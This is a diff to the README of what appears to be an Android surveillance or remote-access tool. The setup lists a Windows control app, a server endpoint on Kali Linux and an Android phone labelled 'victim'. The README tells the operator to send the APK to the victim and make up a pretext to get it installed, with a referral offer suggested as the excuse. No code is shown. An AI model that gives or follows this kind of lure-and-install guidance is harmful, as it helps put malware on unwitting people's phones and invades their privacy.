@@ -1,9 +1,14 @@
 Origianlly made by kool_efx ( exclusive only )
 
-APP -> WINDOWS
-SERVER ENDPOINT+ DATA -> Kali
+App -> Windows
+
+Server Endpoint+ DATA -> Kali
+
 victim -> Android
+
 Requirements: just send apk to victim and excuse him to install app just for any reason(u have to made your own reason) ( suggestion : ask him to install for refral)
+
+
 {This project is officially mine from 0 to 100. i have not used anyone else's a file or even a single code.} 
 
 App Frontend
